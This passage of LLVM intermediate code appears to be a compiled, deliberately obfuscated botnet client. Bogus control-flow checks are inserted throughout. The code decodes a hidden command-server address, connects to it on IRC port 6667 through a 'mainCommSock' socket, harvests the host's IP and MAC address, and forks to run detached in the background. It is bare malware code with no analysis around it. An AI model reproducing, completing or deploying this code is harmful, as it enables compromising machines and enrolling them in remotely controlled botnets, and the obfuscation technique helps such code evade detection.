  %63 = load i32, i32* @x.81
  %64 = load i32, i32* @y.82
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %62
  %71 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %72 = call i8* @strchr(i8* %71, i32 58) #10
  %73 = getelementptr inbounds i8, i8* %72, i64 1
  %74 = call i32 @atoi(i8* %73) #10
  store i32 %74, i32* %3, align 4
  %75 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %76 = call i8* @strchr(i8* %75, i32 58) #10
  store i8 0, i8* %76, align 1
  %77 = load i32, i32* @x.81
  %78 = load i32, i32* @y.82
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %85

; <label>:85:                                     ; preds = %originalBBpart28, %originalBBpart24
  %86 = call i32 @socket(i32 2, i32 1, i32 0) #4
  store i32 %86, i32* @mainCommSock, align 4
  %87 = load i32, i32* @mainCommSock, align 4
  %88 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %89 = load i32, i32* %3, align 4
  %90 = call i32 @connectTimeout(i32 %87, i8* %88, i32 %89, i32 30)
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %93, label %92

; <label>:92:                                     ; preds = %85
  store i32 1, i32* %1, align 4
  br label %94

; <label>:93:                                     ; preds = %85
  store i32 0, i32* %1, align 4
  br label %94

; <label>:94:                                     ; preds = %93, %92
  %95 = load i32, i32* @x.81
  %96 = load i32, i32* @y.82
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %94
  %103 = load i32, i32* %1, align 4
  %104 = load i32, i32* @x.81
  %105 = load i32, i32* @y.82
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret i32 %103

originalBBalteredBB:                              ; preds = %originalBB, %7
  %112 = load i32, i32* @mainCommSock, align 4
  %113 = call i32 @close(i32 %112)
  store i32 0, i32* @mainCommSock, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %35
  %114 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %115 = load i32, i32* @currentServer, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %116
  %118 = load i8*, i8** %117, align 8
  %119 = call i8* @decode(i8* %118)
  %120 = call i8* @strcpy(i8* %114, i8* %119) #4
  store i32 6667, i32* %3, align 4
  %121 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %122 = call i8* @strchr(i8* %121, i32 58) #10
  %123 = icmp ne i8* %122, null
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %62
  %124 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %125 = call i8* @strchr(i8* %124, i32 58) #10
  %126 = getelementptr inbounds i8, i8* %125, i64 1
  %127 = call i32 @atoi(i8* %126) #10
  store i32 %127, i32* %3, align 4
  %128 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %129 = call i8* @strchr(i8* %128, i32 58) #10
  store i8 0, i8* %129, align 1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %94
  %130 = load i32, i32* %1, align 4
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = load i32, i32* @x.83
  %2 = load i32, i32* @y.84
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [4096 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca %struct.ifreq, align 8
  %20 = call i32 @socket(i32 2, i32 2, i32 0) #4
  store i32 %20, i32* %10, align 4
  %21 = load i32, i32* %10, align 4
  %22 = icmp eq i32 %21, -1
  %23 = load i32, i32* @x.83
  %24 = load i32, i32* @y.84
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %32

; <label>:31:                                     ; preds = %originalBBpart2
  store i32 0, i32* %9, align 4
  br label %277

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i32, i32* @x.83
  %34 = load i32, i32* @y.84
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = bitcast %struct.sockaddr_in* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 16, i32 4, i1 false)
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %42, align 4
  %43 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.72, i32 0, i32 0)) #4
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  store i32 %43, i32* %45, align 4
  %46 = call zeroext i16 @htons(i16 zeroext 53) #13
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %46, i16* %47, align 2
  %48 = load i32, i32* %10, align 4
  %49 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %50 = call i32 @connect(i32 %48, %struct.sockaddr* %49, i32 16)
  store i32 %50, i32* %12, align 4
  %51 = load i32, i32* %12, align 4
  %52 = icmp eq i32 %51, -1
  %53 = load i32, i32* @x.83
  %54 = load i32, i32* @y.84
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %52, label %61, label %62

; <label>:61:                                     ; preds = %originalBBpart24
  store i32 0, i32* %9, align 4
  br label %277

; <label>:62:                                     ; preds = %originalBBpart24
  %63 = load i32, i32* @x.83
  %64 = load i32, i32* @y.84
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %62
  store i32 16, i32* %14, align 4
  %71 = load i32, i32* %10, align 4
  %72 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %73 = call i32 @getsockname(i32 %71, %struct.sockaddr* %72, i32* %14) #4
  store i32 %73, i32* %12, align 4
  %74 = load i32, i32* %12, align 4
  %75 = icmp eq i32 %74, -1
  %76 = load i32, i32* @x.83
  %77 = load i32, i32* @y.84
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %75, label %84, label %101

; <label>:84:                                     ; preds = %originalBBpart28
  %85 = load i32, i32* @x.83
  %86 = load i32, i32* @y.84
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %84
  store i32 0, i32* %9, align 4
  %93 = load i32, i32* @x.83
  %94 = load i32, i32* @y.84
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %277

; <label>:101:                                    ; preds = %originalBBpart28
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  %104 = load i32, i32* %103, align 4
  store i32 %104, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %105 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.73, i32 0, i32 0), i32 0)
  store i32 %105, i32* %15, align 4
  br label %106

; <label>:106:                                    ; preds = %175, %101
  %107 = load i32, i32* @x.83
  %108 = load i32, i32* @y.84
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %106
  %115 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %116 = load i32, i32* %15, align 4
  %117 = call i8* @fdgets(i8* %115, i32 4096, i32 %116)
  %118 = icmp ne i8* %117, null
  %119 = load i32, i32* @x.83
  %120 = load i32, i32* @y.84
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %118, label %127, label %177

; <label>:127:                                    ; preds = %originalBBpart216
  %128 = load i32, i32* @x.83
  %129 = load i32, i32* @y.84
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %127
  %136 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %137 = call i8* @strstr(i8* %136, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.74, i32 0, i32 0)) #10
  %138 = icmp ne i8* %137, null
  %139 = load i32, i32* @x.83
  %140 = load i32, i32* @y.84
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %138, label %147, label %175

; <label>:147:                                    ; preds = %originalBBpart220
  %148 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  store i8* %148, i8** %17, align 8
  br label %149

; <label>:149:                                    ; preds = %170, %147
  %150 = load i32, i32* @x.83
  %151 = load i32, i32* @y.84
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %149
  %158 = load i8*, i8** %17, align 8
  %159 = load i8, i8* %158, align 1
  %160 = zext i8 %159 to i32
  %161 = icmp ne i32 %160, 9
  %162 = load i32, i32* @x.83
  %163 = load i32, i32* @y.84
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %161, label %170, label %173

; <label>:170:                                    ; preds = %originalBBpart224
  %171 = load i8*, i8** %17, align 8
  %172 = getelementptr inbounds i8, i8* %171, i32 1
  store i8* %172, i8** %17, align 8
  br label %149

; <label>:173:                                    ; preds = %originalBBpart224
  %174 = load i8*, i8** %17, align 8
  store i8 0, i8* %174, align 1
  br label %177

; <label>:175:                                    ; preds = %originalBBpart220
  %176 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %176, i8 0, i64 4096, i32 16, i1 false)
  br label %106

; <label>:177:                                    ; preds = %173, %originalBBpart216
  %178 = load i32, i32* @x.83
  %179 = load i32, i32* @y.84
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %177
  %186 = load i32, i32* %15, align 4
  %187 = call i32 @close(i32 %186)
  %188 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %189 = load i8, i8* %188, align 16
  %190 = icmp ne i8 %189, 0
  %191 = load i32, i32* @x.83
  %192 = load i32, i32* @y.84
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %190, label %199, label %258

; <label>:199:                                    ; preds = %originalBBpart228
  %200 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %19, i32 0, i32 0
  %201 = bitcast %union.anon.6* %200 to [16 x i8]*
  %202 = getelementptr inbounds [16 x i8], [16 x i8]* %201, i32 0, i32 0
  %203 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %204 = call i8* @strcpy(i8* %202, i8* %203) #4
  %205 = load i32, i32* %10, align 4
  %206 = call i32 (i32, i64, ...) @ioctl(i32 %205, i64 35111, %struct.ifreq* %19) #4
  store i32 0, i32* %18, align 4
  br label %207

; <label>:207:                                    ; preds = %originalBBpart242, %199
  %208 = load i32, i32* %18, align 4
  %209 = icmp slt i32 %208, 6
  br i1 %209, label %210, label %257

; <label>:210:                                    ; preds = %207
  %211 = load i32, i32* @x.83
  %212 = load i32, i32* @y.84
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %210
  %219 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %19, i32 0, i32 1
  %220 = bitcast %union.anon.7* %219 to %struct.sockaddr*
  %221 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %220, i32 0, i32 1
  %222 = getelementptr inbounds [14 x i8], [14 x i8]* %221, i32 0, i32 0
  %223 = load i32, i32* %18, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds i8, i8* %222, i64 %224
  %226 = load i8, i8* %225, align 1
  %227 = load i32, i32* %18, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %228
  store i8 %226, i8* %229, align 1
  %230 = load i32, i32* @x.83
  %231 = load i32, i32* @y.84
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %238

; <label>:238:                                    ; preds = %originalBBpart232
  %239 = load i32, i32* @x.83
  %240 = load i32, i32* @y.84
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %238
  %247 = load i32, i32* %18, align 4
  %248 = add nsw i32 %247, 1
  store i32 %248, i32* %18, align 4
  %249 = load i32, i32* @x.83
  %250 = load i32, i32* @y.84
  %251 = sub i32 %249, 1
  %252 = mul i32 %249, %251
  %253 = urem i32 %252, 2
  %254 = icmp eq i32 %253, 0
  %255 = icmp slt i32 %250, 10
  %256 = or i1 %254, %255
  br i1 %256, label %originalBBpart242, label %originalBB34alteredBB

originalBBpart242:                                ; preds = %originalBB34
  br label %207

; <label>:257:                                    ; preds = %207
  br label %258

; <label>:258:                                    ; preds = %257, %originalBBpart228
  %259 = load i32, i32* @x.83
  %260 = load i32, i32* @y.84
  %261 = sub i32 %259, 1
  %262 = mul i32 %259, %261
  %263 = urem i32 %262, 2
  %264 = icmp eq i32 %263, 0
  %265 = icmp slt i32 %260, 10
  %266 = or i1 %264, %265
  br i1 %266, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %258
  %267 = load i32, i32* %10, align 4
  %268 = call i32 @close(i32 %267)
  %269 = load i32, i32* @x.83
  %270 = load i32, i32* @y.84
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %277

; <label>:277:                                    ; preds = %originalBBpart246, %originalBBpart212, %61, %31
  %278 = load i32, i32* %9, align 4
  ret i32 %278

originalBBalteredBB:                              ; preds = %originalBB, %0
  %279 = alloca i32, align 4
  %280 = alloca i32, align 4
  %281 = alloca %struct.sockaddr_in, align 4
  %282 = alloca i32, align 4
  %283 = alloca %struct.sockaddr_in, align 4
  %284 = alloca i32, align 4
  %285 = alloca i32, align 4
  %286 = alloca [4096 x i8], align 16
  %287 = alloca i8*, align 8
  %288 = alloca i32, align 4
  %289 = alloca %struct.ifreq, align 8
  %290 = call i32 @socket(i32 2, i32 2, i32 0) #4
  store i32 %290, i32* %280, align 4
  %291 = load i32, i32* %280, align 4
  %292 = icmp eq i32 %291, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  %293 = bitcast %struct.sockaddr_in* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* %293, i8 0, i64 16, i32 4, i1 false)
  %294 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %294, align 4
  %295 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.72, i32 0, i32 0)) #4
  %296 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %297 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %296, i32 0, i32 0
  store i32 %295, i32* %297, align 4
  %298 = call zeroext i16 @htons(i16 zeroext 53) #13
  %299 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %298, i16* %299, align 2
  %300 = load i32, i32* %10, align 4
  %301 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %302 = call i32 @connect(i32 %300, %struct.sockaddr* %301, i32 16)
  store i32 %302, i32* %12, align 4
  %303 = load i32, i32* %12, align 4
  %304 = icmp eq i32 %303, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %62
  store i32 16, i32* %14, align 4
  %305 = load i32, i32* %10, align 4
  %306 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %307 = call i32 @getsockname(i32 %305, %struct.sockaddr* %306, i32* %14) #4
  store i32 %307, i32* %12, align 4
  %308 = load i32, i32* %12, align 4
  %309 = icmp eq i32 %308, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %84
  store i32 0, i32* %9, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %106
  %310 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %311 = load i32, i32* %15, align 4
  %312 = call i8* @fdgets(i8* %310, i32 4096, i32 %311)
  %313 = icmp ne i8* %312, null
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %127
  %314 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %315 = call i8* @strstr(i8* %314, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.74, i32 0, i32 0)) #10
  %316 = icmp ne i8* %315, null
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %149
  %317 = load i8*, i8** %17, align 8
  %318 = load i8, i8* %317, align 1
  %319 = zext i8 %318 to i32
  %320 = icmp ne i32 %319, 9
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %177
  %321 = load i32, i32* %15, align 4
  %322 = call i32 @close(i32 %321)
  %323 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %324 = load i8, i8* %323, align 16
  %325 = icmp ne i8 %324, 0
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %210
  %326 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %19, i32 0, i32 1
  %327 = bitcast %union.anon.7* %326 to %struct.sockaddr*
  %328 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %327, i32 0, i32 1
  %329 = getelementptr inbounds [14 x i8], [14 x i8]* %328, i32 0, i32 0
  %330 = load i32, i32* %18, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds i8, i8* %329, i64 %331
  %333 = load i8, i8* %332, align 1
  %334 = load i32, i32* %18, align 4
  %335 = sext i32 %334 to i64
  %336 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %335
  store i8 %333, i8* %336, align 1
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %238
  %337 = load i32, i32* %18, align 4
  %_ = sub i32 0, %337
  %gen = add i32 %_, 1
  %_35 = sub i32 %337, 1
  %gen36 = mul i32 %_35, 1
  %_37 = shl i32 %337, 1
  %_38 = sub i32 %337, 1
  %gen39 = mul i32 %_38, 1
  %_40 = shl i32 %337, 1
  %338 = add nsw i32 %337, 1
  store i32 %338, i32* %18, align 4
  br label %originalBB34

originalBB44alteredBB:                            ; preds = %originalBB44, %258
  %339 = load i32, i32* %10, align 4
  %340 = call i32 @close(i32 %339)
  br label %originalBB44
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #3

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.75, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [4096 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca [1024 x i8], align 16
  %19 = alloca i32, align 4
  %20 = alloca [10 x i8*], align 16
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = call i32 @getpid() #4
  %26 = xor i32 %24, %25
  call void @srand(i32 %26) #4
  %27 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %28 = call i32 @getpid() #4
  %29 = xor i32 %27, %28
  call void @init_rand(i32 %29)
  %30 = call i32 @getOurIP()
  %31 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), align 1
  %32 = zext i8 %31 to i32
  %33 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 1), align 1
  %34 = zext i8 %33 to i32
  %35 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 2), align 1
  %36 = zext i8 %35 to i32
  %37 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 3), align 1
  %38 = zext i8 %37 to i32
  %39 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 4), align 1
  %40 = zext i8 %39 to i32
  %41 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 5), align 1
  %42 = zext i8 %41 to i32
  %43 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.76, i32 0, i32 0), i32 %32, i32 %34, i32 %36, i32 %38, i32 %40, i32 %42)
  %44 = call i32 @fork() #4
  store i32 %44, i32* %6, align 4
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %46, label %65

; <label>:46:                                     ; preds = %2
  %47 = load i32, i32* @x.87
  %48 = load i32, i32* @y.88
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %46
  %55 = load i32, i32* %6, align 4
  %56 = call i32 @waitpid(i32 %55, i32* %8, i32 0)
  call void @exit(i32 0) #14
  %57 = load i32, i32* @x.87
  %58 = load i32, i32* @y.88
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  unreachable

; <label>:65:                                     ; preds = %2
  %66 = load i32, i32* @x.87
  %67 = load i32, i32* @y.88
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %65
  %74 = load i32, i32* %6, align 4
  %75 = icmp ne i32 %74, 0
  %76 = load i32, i32* @x.87
  %77 = load i32, i32* @y.88
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %75, label %112, label %84

; <label>:84:                                     ; preds = %originalBBpart24
  %85 = call i32 @fork() #4
  store i32 %85, i32* %7, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %88

; <label>:87:                                     ; preds = %84
  call void @exit(i32 0) #14
  unreachable

; <label>:88:                                     ; preds = %84
  %89 = load i32, i32* %7, align 4
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %92, label %91

; <label>:91:                                     ; preds = %88
  br label %94

; <label>:92:                                     ; preds = %88
